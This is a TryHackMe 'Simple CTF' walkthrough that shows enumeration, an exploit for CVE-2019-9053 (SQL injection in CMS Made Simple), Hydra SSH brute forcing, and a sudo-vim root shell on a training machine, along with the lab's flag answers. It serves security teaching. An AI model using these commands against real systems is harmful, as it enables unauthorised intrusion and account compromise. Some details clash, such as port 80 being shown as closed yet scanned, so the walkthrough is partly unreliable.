# Simple CTF — TryHackMe Walkthrough

> Beginner level CTF. Deploy the machine and attempt the questions!

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/easyctf">
    <img src="https://img.shields.io/badge/TryHackMe-Simple%20CTF-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Enumeration%20%7C%20SQLi%20%7C%20Brute%20Force%20%7C%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Web Enumeration |
| 2 | Network Enumeration |
| 3 | CVE-2019-9053 — CMS Made Simple < 2.2.10 SQL Injection |
| 4 | SSH Brute Forcing |
| 5 | Misconfigured Sudo Binary (vim) |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Use Nikto to perform basic web server vulnerability scanning
- Perform a full port scan with Nmap and identify services on non-standard ports
- Use Gobuster to discover hidden web directories
- Identify a CMS installation and match it to a known CVE
- Brute-force SSH credentials on a non-standard port using Hydra
- Escalate privileges using a misconfigured `sudo` rule on `vim` via GTFOBins

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, Nikto, Gobuster, Hydra, and an SSH client installed
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)

---

## Task 1 — Simple CTF

---

### Step 1 — Web Server Scanning with Nikto

**Approach:** Run Nikto against the web server to quickly identify any obvious misconfigurations, outdated software, or exposed files before doing a full Nmap scan.

```
kali@kali:~/CTFs/tryhackme/Simple CTF$ nikto -h http://Machine_IP/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          Machine_IP
+ Target Hostname:    Machine_IP
+ Target Port:        80
+ Start Time:         2020-10-04 20:47:22 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 590523e6dfcd7, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3233: /icons/README: Apache default file found.
```

> **Note:** Nikto flags several issues — missing security headers, an outdated Apache version, and most importantly that `robots.txt` contains **2 entries worth investigating manually**. Always check `robots.txt` early — entries are often paths the developer wanted to hide from search engines, which inadvertently draws attention to them.

---

### Step 2 — Network Enumeration with Nmap

**Approach:** Run a full Nmap scan with service detection and OS fingerprinting to identify all open ports and services.

```
kali@kali:~/CTFs/tryhackme/Simple CTF$ sudo nmap -A -sC -sV -sS -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 20:43 CEST
Nmap scan report for Machine_IP
Host is up (0.094s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   closed http
2222/tcp open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.04 seconds
```

> **Note:** Three ports are detected — FTP on **21**, HTTP on **80** (closed), and SSH on **2222** (a non-standard port). Ports 21 and 80 are both below 1000, making the answer to question 1 two services under port 1000. SSH is running on the higher port **2222** — always scan for services on non-standard ports, especially in CTFs. Anonymous FTP login is also allowed, worth investigating for any accessible files.

---

### Question 1 — How many services are running under port 1000?

<details>
<summary>Reveal Answer</summary>

**`2`**

</details>

---

### Question 2 — What is running on the higher port?

<details>
<summary>Reveal Answer</summary>

**`SSH`**

</details>

---

### Step 3 — Web Directory Enumeration with Gobuster

**Approach:** Use Gobuster to brute-force directories on the web server and discover hidden paths.

```
kali@kali:~/CTFs/tryhackme/Simple CTF$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://Machine_IP/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://Machine_IP/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/04 20:46:58 Starting gobuster
===============================================================
/simple (Status: 301)
===============================================================
2020/10/04 20:54:11 Finished
===============================================================
```

> **Note:** Gobuster finds a `/simple` directory with a `301 Redirect`. Navigating to `http://Machine_IP/simple` reveals a **CMS Made Simple** installation. Checking the CMS version (visible in the page footer or at `/simple/admin/`) shows it is running a version below **2.2.10**, which is vulnerable to CVE-2019-9053 — a time-based blind SQL injection in the `m1_iduser` parameter of the News module.

---

### Question 3 — What is the CVE you are using against the application?

> **Note:** CVE-2019-9053 affects CMS Made Simple versions below 2.2.10. The vulnerability is a **SQL injection** in the News module that allows an unauthenticated attacker to extract usernames, email addresses, and password hashes from the database. The exploit is documented at [Exploit-DB #46635](https://www.exploit-db.com/exploits/46635).

<details>
<summary>Reveal Answer</summary>

**`CVE-2019-9053`**

</details>

---

### Question 4 — To what kind of vulnerability is the application vulnerable?

<details>
<summary>Reveal Answer</summary>

**`SQLi`**

</details>

---

### Step 4 — Exploiting CVE-2019-9053 to Extract Credentials

**Approach:** Download and run the Python exploit for CVE-2019-9053 against `http://Machine_IP/simple`. The script performs a time-based blind SQL injection to extract the username, email, and password hash. Once the hash is extracted, crack it using a wordlist.

> **Note:** The exploit script from Exploit-DB performs the SQL injection automatically. Run it with:
> ```
> python exploit.py -u http://Machine_IP/simple --crack -w /usr/share/wordlists/rockyou.txt
> ```
> The script extracts the username **`mitch`** along with a salted MD5 hash and cracks it to reveal the password. This username and password are then used to brute-force SSH in the next step.

---

### Step 5 — Brute-Forcing SSH with Hydra

**Approach:** Use Hydra to brute-force SSH on port **2222** using the username `mitch` discovered through the SQL injection and the `rockyou.txt` wordlist. The `-s` flag specifies a non-standard port.

```
kali@kali:~/CTFs/tryhackme/Simple CTF$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt Machine_IP -s 2222 -Vv ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-04 21:04:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://Machine_IP:2222/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://mitch@Machine_IP:2222
[INFO] Successful, password authentication is supported by Machine_IP:2222
[ATTEMPT] target Machine_IP - login "mitch" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target Machine_IP - login "mitch" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target Machine_IP - login "mitch" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target Machine_IP - login "mitch" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target Machine_IP - login "mitch" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target Machine_IP - login "mitch" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target Machine_IP - login "mitch" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target Machine_IP - login "mitch" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target Machine_IP - login "mitch" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target Machine_IP - login "mitch" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target Machine_IP - login "mitch" - pass "secret" - 42 of 14344401 [child 2] (0/2)
[2222][ssh] host: Machine_IP   login: mitch   password: secret
[STATUS] attack finished for Machine_IP (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-04 21:04:18
```

> **Note:** Hydra finds the password **`secret`** very quickly — it is only the 42nd attempt. The `-s 2222` flag is essential here to target the non-standard SSH port rather than the default 22. The `-Vv` flag enables verbose output so you can watch each attempt in real time, which is useful for learning and debugging.

---

### Question 5 — What is the password?

<details>
<summary>Reveal Answer</summary>

**`secret`**

</details>

---

### Step 6 — SSH Login and User Flag

**Approach:** Log in via SSH using the cracked credentials on port 2222. Read the user flag directly from the home directory.

```
kali@kali:~/CTFs/tryhackme/Simple CTF$ ssh mitch@Machine_IP -p 2222
The authenticity of host '[Machine_IP]:2222 ([Machine_IP]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[Machine_IP]:2222' (ECDSA) to the list of known hosts.
mitch@Machine_IP's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ whoami
mitch
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
```

> **Note:** We land directly in `mitch`'s home directory. The user flag is immediately accessible. Before moving on to privilege escalation, it is always worth checking `/home` to see all users on the system — other accounts may have interesting files or clues.

---

### Question 6 — Where can you login with the details obtained?

<details>
<summary>Reveal Answer</summary>

**`SSH`**

</details>

---

### Question 7 — What is the user flag?

<details>
<summary>Reveal Answer</summary>

**`G00d j0b, keep up!`**

</details>

---

### Question 8 — Is there any other user in the home directory? What is their name?

```
$ ls /home
mitch  sunbath
```

> **Note:** A second user `sunbath` exists on the system. Their home directory may contain useful files, though escalation here goes through `sudo` rather than pivoting to another user.

<details>
<summary>Reveal Answer</summary>

**`sunbath`**

</details>

---

### Step 7 — Privilege Escalation via Misconfigured vim Sudo Rule

**Approach:** Check what commands `mitch` can run with sudo using `sudo -l`. The output reveals a passwordless sudo rule for `/usr/bin/vim`. Use the GTFOBins technique to spawn a root shell directly from within vim.

```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

> **Note:** `mitch` can run `vim` as root without a password. `vim` has a built-in command execution feature — the `:!` prefix runs shell commands from within the editor. By launching `vim` with sudo and then running `!/bin/sh`, the shell spawns with root privileges. This is documented on [GTFOBins/vim](https://gtfobins.github.io/gtfobins/vim/#sudo). A quicker one-liner that does this without entering interactive vim is `sudo vim -c ':!/bin/sh'`.

---

### Question 9 — What can you leverage to spawn a privileged shell?

<details>
<summary>Reveal Answer</summary>

**`vim`**

</details>

---

### Step 8 — Getting Root and Reading the Root Flag

**Approach:** Run the vim GTFOBins one-liner to spawn a root shell, then navigate to `/root` and read the flag.

```
$ sudo vim -c ':!/bin/sh'

# cd /root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
```

> **Note:** The `vim -c` flag runs a vim command on startup before displaying the editor. `:!/bin/sh` executes `/bin/sh` as a shell command — since vim was launched with `sudo`, the shell inherits root privileges. The `#` prompt confirms we are running as root.

---

### Question 10 — What is the root flag?

<details>
<summary>Reveal Answer</summary>

**`W3ll d0n3. You made it!`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nikto web scan | Found outdated Apache, missing headers, and `robots.txt` entries |
| 2 | Nmap port scan | Found FTP (21), closed HTTP (80), SSH on non-standard port 2222 |
| 3 | Gobuster directory brute-force | Discovered `/simple` running CMS Made Simple |
| 4 | CMS version check | Identified version below 2.2.10 — vulnerable to CVE-2019-9053 (SQLi) |
| 5 | CVE-2019-9053 exploit | Extracted username `mitch` and cracked password hash |
| 6 | Hydra SSH brute-force on port 2222 | Cracked `mitch:secret` |
| 7 | SSH login as `mitch` | Gained shell access, read `user.txt` |
| 8 | `sudo -l` enumeration | Discovered passwordless sudo rule for `vim` |
| 9 | GTFOBins vim exploit | Ran `sudo vim -c ':!/bin/sh'` to spawn root shell |
| 10 | Read `root.txt` | Found root flag in `/root/` |
